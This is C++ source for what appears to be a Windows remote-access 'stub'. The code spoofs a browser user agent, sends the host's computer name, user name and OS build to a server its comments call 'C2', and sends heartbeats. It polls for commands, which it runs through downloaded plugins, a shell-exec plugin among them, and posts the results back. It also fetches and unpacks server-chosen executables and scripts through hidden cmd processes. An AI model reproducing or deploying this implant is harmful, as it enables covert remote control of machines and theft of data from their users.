#include "StubCore.h"
#include "Logger.h"
#include "NetworkFix.h"
#include <wininet.h>
#include <sstream>
#include <filesystem>
#include <algorithm>

#pragma comment(lib, "wininet.lib")

// ═══════════════════════════════════════════════
// Stub 核心 — 干净的网络客户端 + MCP 进程转发
// ═══════════════════════════════════════════════

StubCore::StubCore() {
    LOG_I("Stub", "Constructor start");
    // 服务器地址：从配置文件或环境变量读取
    _serverUrl = getenv("R6M_SERVER") ? getenv("R6M_SERVER") : "http://[::1]:8080";
    LOG_I("Stub", "Setting up HTTP session...");
    _hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (_hSession) {
        LOG_I("Stub", "HTTP session OK");
    } else {
        LOG_E("Stub", "HTTP session FAILED");
    }
    LOG_I("Stub", "Constructor done");
}

StubCore::~StubCore() {
    _running = false;
    if (_heartbeatThread.joinable()) _heartbeatThread.join();
    if (_hSession) InternetCloseHandle(_hSession);
}

// ── HTTP ──

bool StubCore::httpPost(const std::string& path, const std::string& body, std::string& response) {
    std::string url = _serverUrl + path;
    LOG_D("HTTP", ("POST " + url).c_str());

    // Use HttpOpenRequest for better IPv6 support
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    wchar_t wUrl[1024];
    MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, wUrl, 1024);

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E("HTTP", "URL parse failed");
        return false;
    }

    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    int port = urlComp.nPort;

    LOG_D("HTTP", ("Host: " + host + " Port: " + std::to_string(port)).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E("HTTP", "InternetConnect failed");
        return false;
    }

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", pathStr.c_str(), nullptr, nullptr,
        nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hReq) {
        LOG_E("HTTP", "HttpOpenRequest failed");
        InternetCloseHandle(hConn);
        return false;
    }

    // Set timeout (30 seconds)
    DWORD timeout = 30000;
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    const char* headers = "Content-Type: application/json\r\n";
    if (!HttpSendRequestA(hReq, headers, strlen(headers), (LPVOID)body.c_str(), body.size())) {
        LOG_E("HTTP", "HttpSendRequestA failed");
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    char buf[65536];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    response = result;
    LOG_D("HTTP", ("Response: " + result.substr(0, 100)).c_str());
    return true;
}

std::string StubCore::httpGet(const std::string& path) {
    std::string url = _serverUrl + path;
    HINTERNET hUrl = InternetOpenUrlA(_hSession, url.c_str(), nullptr, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hUrl) return "";

    char buf[65536];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hUrl, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
    }
    InternetCloseHandle(hUrl);
    return result;
}

// ── 主循环 ──

void StubCore::run(const std::wstring& pluginDir) {
    _running = true;
    LOG_INFO("Stub", "=== START ===");

    // Parse command line
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    for (int i = 1; i < argc; i++) {
        if (std::wstring(argv[i]) == L"--server" && i + 1 < argc) {
            std::wstring ws(argv[i + 1]);
            _serverUrl = std::string(ws.begin(), ws.end());
        }
    }
    if (argv) LocalFree(argv);
    LOG_INFO("Stub", ("URL=" + _serverUrl).c_str());

    LOG_INFO("Stub", "A: Network fix");
    NetworkFix::FixAll(_serverUrl);
    LOG_INFO("Stub", "B: Network done");

    LOG_INFO("Stub", "C: HWID");
    _hwid = generateHWID();
    LOG_INFO("Stub", ("HWID=" + _hwid).c_str());

    LOG_INFO("Stub", "D: Plugins");
    syncPlugins(pluginDir);       // 从服务端同步缺失的插件 + 嵌入式 Python

    // 设置嵌入式 Python 路径
    {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep); ws = ws.substr(0, ws.find_last_of(L'\\'));
        std::wstring py = ws + L"\\runtime\\python.exe";
        if (GetFileAttributesW(py.c_str()) != INVALID_FILE_ATTRIBUTES) {
            _plugins.setPythonPath(py);
            LOG_INFO("Stub", "Embedded Python found");
        }
    }

    _plugins.scanPlugins(pluginDir);
    _plugins.buildToolMap();

    // 连接前验证 C2 可达，最多重试 3 次，指数退避
    LOG_INFO("Stub", "E: Verify C2 reachable");
    for (int attempt = 1; attempt <= 3; ++attempt) {
        if (NetworkFix::VerifyC2Reachable(_serverUrl)) {
            LOG_INFO("Stub", ("C2 reachable on attempt " + std::to_string(attempt)).c_str());
            break;
        }
        LOG_WARN("Stub", ("C2 unreachable, attempt " + std::to_string(attempt) + "/3, waiting...").c_str());
        std::this_thread::sleep_for(std::chrono::seconds(attempt * 5));
    }

    LOG_INFO("Stub", "F: Connect");
    for (int attempt = 1; attempt <= 5; ++attempt) {
        if (connectToServer()) break;
        LOG_WARN("Stub", ("Connect failed, attempt " + std::to_string(attempt) + "/5, retry in " + std::to_string(attempt * 3) + "s").c_str());
        std::this_thread::sleep_for(std::chrono::seconds(attempt * 3));
    }
    LOG_INFO("Stub", "F: Heartbeat thread");
    _heartbeatThread = std::thread([this]() {
        while (_running) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            try {
                std::string body = "{\"hwid\":\"" + _hwid + "\"}";
                std::string resp;
                httpPost("/api/heartbeat", body, resp);
            } catch (...) {}
        }
    });
    LOG_INFO("Stub", "G: Poll loop");
    pollLoop();
    _running = false;
    _plugins.stopAll();
    LOG_INFO("Stub", "====== RemoteClient 退出 ======");
}

bool StubCore::connectToServer() {
    LOG_INFO("Stub", ("连接: " + _serverUrl).c_str());
    std::string info = collectSystemInfo();
    std::string body = "{\"hwid\":\"" + _hwid + "\",\"info\":" + info + "}";
    std::string resp;
    if (httpPost("/api/agent/register", body, resp)) {
        LOG_INFO("Stub", "连接成功");
        return true;
    }
    return false;
}

void StubCore::pollLoop() {
    LOG_INFO("Stub", "开始轮询...");
    while (_running) {
        std::this_thread::sleep_for(std::chrono::seconds(3));
        try {
            std::string body = "{\"hwid\":\"" + _hwid + "\"}";
            std::string resp;
            if (!httpPost("/api/agent/poll", body, resp)) continue;
            if (resp.empty() || resp == "{}" || resp == "null") continue;

            // Parse method from JSON response
            std::string method;
            auto mp = resp.find("\"method\"");
            if (mp != std::string::npos) {
                auto colon = resp.find(':', mp);
                auto q1 = resp.find('"', colon + 1);
                auto q2 = resp.find('"', q1 + 1);
                if (q1 != std::string::npos && q2 != std::string::npos)
                    method = resp.substr(q1 + 1, q2 - q1 - 1);
            }
            if (method.empty()) continue;

            // Extract params (simple brace matching)
            std::string params = "{}";
            auto pp = resp.find("\"params\"");
            if (pp != std::string::npos) {
                auto pc = resp.find(':', pp);
                auto pb = resp.find('{', pc);
                if (pb != std::string::npos) {
                    int depth = 1; size_t pe = pb + 1;
                    while (depth > 0 && pe < resp.size()) {
                        if (resp[pe] == '{') depth++;
                        else if (resp[pe] == '}') depth--;
                        pe++;
                    }
                    params = resp.substr(pb, pe - pb);
                }
            }
            if (method.empty()) continue;

            LOG_INFO("Stub", ("指令: " + method).c_str());

            // 解析 request_id（服务端新增）
            std::string requestId;
            auto rid = resp.find("\"request_id\"");
            if (rid != std::string::npos) {
                auto colon = resp.find(':', rid);
                auto q1 = resp.find('"', colon + 1);
                auto q2 = resp.find('"', q1 + 1);
                if (q1 != std::string::npos && q2 != std::string::npos)
                    requestId = resp.substr(q1 + 1, q2 - q1 - 1);
            }

            // 解析插件 ID：tools/call 时从工具映射表查插件，其他方法取前缀
            std::string pluginId;
            if (method == "tools/call") {
                auto np = params.find("\"name\"");
                std::string toolName;
                if (np != std::string::npos) {
                    auto colon = params.find(':', np);
                    auto q1 = params.find('"', colon + 1);
                    auto q2 = params.find('"', q1 + 1);
                    if (q1 != std::string::npos && q2 != std::string::npos)
                        toolName = params.substr(q1 + 1, q2 - q1 - 1);
                }
                pluginId = _plugins.resolvePluginForTool(toolName);
                if (pluginId.empty()) {
                    LOG_WARN("Stub", ("未找到处理工具 '" + toolName + "' 的插件").c_str());
                    continue;
                }
            } else {
                pluginId = method.substr(0, method.find('.'));
            }

            // 处理 deploy_file 指令
            if (method == "deploy_file") {
                LOG_INFO("Stub", "收到文件部署指令");
                handleDeployFile(params);
                // 回传部署结果
                if (!requestId.empty()) {
                    std::string postBody = "{\"request_id\":\"" + requestId + "\",\"result\":{\"ok\":true}}";
                    std::string resp2;
                    httpPost("/api/agent/result", postBody, resp2);
                }
                continue;
            }

            // 分发给 MCP 插件
            std::string result = _plugins.callPlugin(pluginId, method, params);
            LOG_DEBUG("Stub", ("插件响应: " + result.substr(0, 200)).c_str());

            // 回传结果（仅 tools/call 需要）
            if (!requestId.empty() && method == "tools/call") {
                std::string postBody = "{\"request_id\":\"" + requestId + "\",\"result\":" + result + "}";
                std::string resp2;
                httpPost("/api/agent/result", postBody, resp2);
                LOG_DEBUG("Stub", ("结果回传: " + resp2).c_str());
            }

        } catch (const std::exception& e) {
            LOG_ERROR("Stub", ("轮询异常: " + std::string(e.what())).c_str());
        } catch (...) {
            LOG_ERROR("Stub", "轮询异常");
        }
    }
}

std::string StubCore::collectSystemInfo() {
    wchar_t computer[MAX_PATH] = {}; DWORD csz = MAX_PATH;
    GetComputerNameW(computer, &csz);
    wchar_t user[MAX_PATH] = {}; DWORD usz = MAX_PATH;
    GetUserNameW(user, &usz);

    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    auto fn = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    DWORD build = 0;
    if (fn) {
        RTL_OSVERSIONINFOW rovi = { sizeof(rovi) };
        fn(&rovi);
        build = rovi.dwBuildNumber;
    }

    // Convert wide strings to UTF-8
    char cs[256] = {}, us[256] = {};
    WideCharToMultiByte(CP_UTF8, 0, computer, -1, cs, sizeof(cs), nullptr, nullptr);
    WideCharToMultiByte(CP_UTF8, 0, user, -1, us, sizeof(us), nullptr, nullptr);
    std::ostringstream ss;
    ss << "{\"computer\":\"" << cs
       << "\",\"user\":\"" << us
       << "\",\"os\":\"Win10 Build " << build
       << "\",\"arch\":\"" << (sizeof(void*) == 8 ? "x64" : "x86") << "\"}";
    return ss.str();
}

std::string StubCore::generateHWID() {
    // 基于 MAC + 计算机名生成稳定 HWID
    wchar_t computer[MAX_PATH] = {}; DWORD sz = MAX_PATH;
    GetComputerNameW(computer, &sz);
    std::wstring ws(computer);
    std::string s(ws.begin(), ws.end());
    // 简单哈希
    unsigned int hash = 5381;
    for (char c : s) hash = ((hash << 5) + hash) + c;
    char buf[32];
    snprintf(buf, sizeof(buf), "%08X", hash);
    return std::string(buf);
}

// ═══════════════════════════════════════════════
// 文件下载 & 部署
// ═══════════════════════════════════════════════

bool StubCore::httpDownload(const std::string& url, const std::wstring& savePath) {
    std::string savePathUtf8(savePath.begin(), savePath.end());
    LOG_I("Download", ("开始下载: " + url).c_str());
    LOG_I("Download", ("保存到: " + savePathUtf8).c_str());

    // 解析 URL
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E("Download", ("URL 解析失败, error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;

    LOG_I("Download", ("Host: " + host + " Path: " + pathStr).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E("Download", ("连接失败: " + host + " error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", pathStr.c_str(), nullptr, nullptr,
        nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hReq) {
        LOG_E("Download", ("请求失败: error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hConn);
        return false;
    }

    DWORD timeout = 120000; // 2 分钟超时
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    if (!HttpSendRequestA(hReq, nullptr, 0, nullptr, 0)) {
        LOG_E("Download", "发送失败");
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 检查状态码
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusSize, nullptr);
    if (statusCode != 200) {
        LOG_E("Download", ("HTTP 状态码: " + std::to_string(statusCode)).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 获取文件大小
    DWORD contentLength = 0;
    DWORD clSize = sizeof(contentLength);
    HttpQueryInfoA(hReq, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &clSize, nullptr);

    // 打开本地文件（用 CreateFileW 支持中文路径）
    HANDLE hFile = CreateFileW(savePath.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG_E("Download", ("无法创建文件, error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 下载
    char buf[65536];
    DWORD totalRead = 0;
    DWORD bytesRead = 0;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        DWORD written = 0;
        WriteFile(hFile, buf, bytesRead, &written, nullptr);
        totalRead += bytesRead;
        if (contentLength > 0) {
            int pct = (int)((long long)totalRead * 100 / contentLength);
            if (pct % 10 == 0) {
                LOG_I("Download", ("进度: " + std::to_string(pct) + "%").c_str());
            }
        }
    }

    CloseHandle(hFile);
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);

    LOG_I("Download", ("下载完成: " + savePathUtf8 + " (" + std::to_string(totalRead) + " bytes)").c_str());
    return true;
}

void StubCore::handleDeployFile(const std::string& params) {
    std::string fileName, targetDir;
    auto fn = params.find("\"file_name\"");
    if (fn != std::string::npos) {
        auto c = params.find(':', fn);
        auto q1 = params.find('"', c + 1);
        auto q2 = params.find('"', q1 + 1);
        if (q1 != std::string::npos && q2 != std::string::npos)
            fileName = params.substr(q1 + 1, q2 - q1 - 1);
    }
    auto td = params.find("\"target_dir\"");
    if (td != std::string::npos) {
        auto c = params.find(':', td);
        auto q1 = params.find('"', c + 1);
        auto q2 = params.find('"', q1 + 1);
        if (q1 != std::string::npos && q2 != std::string::npos)
            targetDir = params.substr(q1 + 1, q2 - q1 - 1);
    }
    for (size_t i = 0; i < fileName.size(); ) {
        if (fileName[i] == '\\' && i + 1 < fileName.size() && fileName[i + 1] == '\\')
            fileName.erase(i, 1); else i++;
    }
    for (size_t i = 0; i < targetDir.size(); ) {
        if (targetDir[i] == '\\' && i + 1 < targetDir.size() && targetDir[i + 1] == '\\')
            targetDir.erase(i, 1); else i++;
    }
    if (fileName.empty()) { LOG_E("Deploy", "empty filename"); return; }
    if (targetDir.empty()) {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep); ws = ws.substr(0, ws.find_last_of(L'\\'));
        targetDir = std::string(ws.begin(), ws.end()) + "\\plugins";
    }
    LOG_I("Deploy", ("deploy: " + fileName + " -> " + targetDir).c_str());
    // create nested dirs
    for (size_t p = 0; p < targetDir.size(); p++) {
        if (targetDir[p] == '\\' || targetDir[p] == '/') {
            std::string sub = targetDir.substr(0, p);
            if (!sub.empty()) CreateDirectoryA(sub.c_str(), nullptr);
        }
    }
    CreateDirectoryA(targetDir.c_str(), nullptr);
    std::string url = _serverUrl + "/api/files/get?name=" + fileName;
    std::wstring save = std::wstring(targetDir.begin(), targetDir.end()) + L"\\" + std::wstring(fileName.begin(), fileName.end());
    if (!httpDownload(url, save)) { LOG_E("Deploy", "download failed"); return; }
    LOG_I("Deploy", "download ok");
    if (fileName.size() > 4 && fileName.substr(fileName.size() - 4) == ".zip") {
        LOG_I("Deploy", "extracting zip...");
        std::string unzipDir = targetDir + "\\" + fileName.substr(0, fileName.size() - 4);
        CreateDirectoryA(unzipDir.c_str(), nullptr);
        std::wstring cmd = L"cmd /c tar -xf \""
            + std::wstring(save.begin(), save.end())
            + L"\" -C \"" + std::wstring(unzipDir.begin(), unzipDir.end()) + L"\"";
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        if (CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                          nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 120000);
            DWORD exitCode = 0;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            LOG_I("Deploy", ("extracted: " + unzipDir + " exit=" + std::to_string(exitCode)).c_str());
        } else { LOG_E("Deploy", "extract failed"); }
    }
    _plugins.scanPlugins(std::wstring(targetDir.begin(), targetDir.end()));
    LOG_I("Deploy", "rescan done");
}

// ═══════════════════════════════════════════════
// 插件同步：从服务端拉取缺失的插件
// ═══════════════════════════════════════════════

void StubCore::syncPlugins(const std::wstring& pluginDir) {
    LOG_I("Sync", "=== syncPlugins start ===");

    // 确保 plugins 目录存在
    CreateDirectoryW(pluginDir.c_str(), nullptr);

    // ═══ 0) 检查并下载嵌入式 Python 运行时 ═══
    // 获取 exe 所在目录
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring appDir = std::wstring(exePath);
    appDir = appDir.substr(0, appDir.find_last_of(L'\\'));
    std::wstring runtimeDir = appDir + L"\\runtime";
    std::wstring pythonExe = runtimeDir + L"\\python.exe";

    if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
        LOG_I("Sync", "Python runtime not found, downloading from server...");
        CreateDirectoryW(runtimeDir.c_str(), nullptr);

        // 从服务端下载 python 嵌入式包
        std::string rtResp = httpGet("/api/runtime");
        LOG_I("Sync", ("Runtime list: " + rtResp.substr(0, 200)).c_str());

        // 找 python*.zip
        std::string pyZip;
        auto pp = rtResp.find("python");
        if (pp != std::string::npos) {
            auto q1 = rtResp.rfind('"', pp);
            auto q2 = rtResp.find('"', pp);
            // 简单提取文件名
            while (pp < rtResp.size() && rtResp[pp] != '"') pp++;
            pyZip = rtResp.substr(q1 + 1, pp - q1 - 1);
        }

        if (!pyZip.empty()) {
            LOG_I("Sync", ("Downloading Python runtime: " + pyZip).c_str());
            // httpDownload 需要完整 URL（InternetCrackUrlA 不支持相对路径）
            std::string zipUrl = _serverUrl + "/api/runtime/get?name=" + pyZip;
            std::wstring zipPath = appDir + L"\\" + std::wstring(pyZip.begin(), pyZip.end());
            if (httpDownload(zipUrl, zipPath)) {
                LOG_I("Sync", "  zip downloaded, extracting...");

                // 解压到 runtime 目录
                std::wstring unzipCmd = L"cmd /c tar -xf \""
                    + zipPath + L"\" -C \"" + runtimeDir + L"\"";
                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi = {};
                if (CreateProcessW(nullptr, (LPWSTR)unzipCmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                                  nullptr, nullptr, &si, &pi)) {
                    WaitForSingleObject(pi.hProcess, 120000);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    LOG_I("Sync", "  Python runtime extracted");
                }
                // 删除 zip
                DeleteFileW(zipPath.c_str());
            } else {
                LOG_E("Sync", "  Python runtime download FAILED");
            }
        }

        // 验证
        if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LOG_E("Sync", "Python runtime install FAILED - plugins will not work");
        } else {
            LOG_I("Sync", "Python runtime ready");
        }
    } else {
        LOG_I("Sync", "Python runtime already installed");
    }

    // ═══ 1) 从服务端获取可用插件列表 ═══
    std::string resp = httpGet("/api/plugins");
    if (resp.empty()) {
        LOG_W("Sync", "Failed to get plugin list from server");
        return;
    }
    LOG_I("Sync", ("Server plugins: " + resp.substr(0, 200)).c_str());

    // 2) 简易 JSON 解析：遍历每个 {...} 块
    //    格式: [{"id":"xxx","name":"xxx","version":"xxx"},...]
    size_t pos = 0;
    int downloaded = 0;
    while ((pos = resp.find("\"id\"", pos)) != std::string::npos) {
        // 提取 id
        auto c1 = resp.find(':', pos);
        auto q1 = resp.find('"', c1 + 1);
        auto q2 = resp.find('"', q1 + 1);
        if (q1 == std::string::npos || q2 == std::string::npos) break;
        std::string pluginId = resp.substr(q1 + 1, q2 - q1 - 1);
        pos = q2 + 1;

        if (pluginId.empty()) continue;

        // 检查本地是否已有此插件
        std::wstring localDir = pluginDir + L"\\" + std::wstring(pluginId.begin(), pluginId.end());
        std::wstring localPjson = localDir + L"\\plugin.json";
        if (GetFileAttributesW(localPjson.c_str()) != INVALID_FILE_ATTRIBUTES) {
            LOG_I("Sync", ("Plugin exists locally: " + pluginId).c_str());
            continue;
        }

        // 3) 本地缺失，从服务端下载整个插件目录
        LOG_I("Sync", ("Downloading plugin: " + pluginId).c_str());
        CreateDirectoryW(localDir.c_str(), nullptr);

        // 下载 plugin.json
        std::string pjsonUrl = "/api/plugins/get?name=" + pluginId + "/plugin.json";
        std::string pjsonBody = httpGet(pjsonUrl);
        if (!pjsonBody.empty()) {
            // 写入本地文件
            std::wstring pjsonPath = localDir + L"\\plugin.json";
            HANDLE hFile = CreateFileW(pjsonPath.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written = 0;
                WriteFile(hFile, pjsonBody.c_str(), (DWORD)pjsonBody.size(), &written, nullptr);
                CloseHandle(hFile);
                LOG_I("Sync", ("  saved plugin.json: " + pluginId).c_str());
            }
        }

        // 从 plugin.json 里找 command 字段，解析需要下载哪些文件
        // command 格式如 "python shell_exec.py" → 需要下载 shell_exec.py
        auto cmdPos = pjsonBody.find("\"command\"");
        if (cmdPos != std::string::npos) {
            auto cc = pjsonBody.find(':', cmdPos);
            auto cq1 = pjsonBody.find('"', cc + 1);
            auto cq2 = pjsonBody.find('"', cq1 + 1);
            if (cq1 != std::string::npos && cq2 != std::string::npos) {
                std::string command = pjsonBody.substr(cq1 + 1, cq2 - cq1 - 1);
                // 解析命令中的文件名
                std::vector<std::string> filesToDownload;
                // "python shell_exec.py" → 提取 shell_exec.py
                // "python3 file_manager.py" → 提取 file_manager.py
                size_t sp = 0;
                while (sp < command.size()) {
                    while (sp < command.size() && command[sp] == ' ') sp++;
                    auto end = command.find(' ', sp);
                    if (end == std::string::npos) end = command.size();
                    std::string token = command.substr(sp, end - sp);
                    // 只下载 .py 或 .js 或 .exe 文件
                    if (token.size() > 3) {
                        std::string ext = token.substr(token.size() - 3);
                        if (ext == ".py" || ext == ".js" || ext == ".exe" || ext == ".sh") {
                            filesToDownload.push_back(token);
                        }
                    }
                    sp = end + 1;
                }

                // 下载每个文件
                for (const auto& fname : filesToDownload) {
                    std::string fileUrl = "/api/plugins/get?name=" + pluginId + "/" + fname;
                    std::string fileBody = httpGet(fileUrl);
                    if (!fileBody.empty()) {
                        std::wstring filePath = localDir + L"\\" + std::wstring(fname.begin(), fname.end());
                        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD written = 0;
                            WriteFile(hFile, fileBody.c_str(), (DWORD)fileBody.size(), &written, nullptr);
                            CloseHandle(hFile);
                            LOG_I("Sync", ("  saved: " + fname).c_str());
                        }
                    } else {
                        LOG_E("Sync", ("  download failed: " + fname).c_str());
                    }
                }
            }
        }

        downloaded++;
        LOG_I("Sync", ("Downloaded plugin: " + pluginId).c_str());
    }

    LOG_I("Sync", ("=== syncPlugins done, downloaded " + std::to_string(downloaded) + " plugins ===").c_str());
}
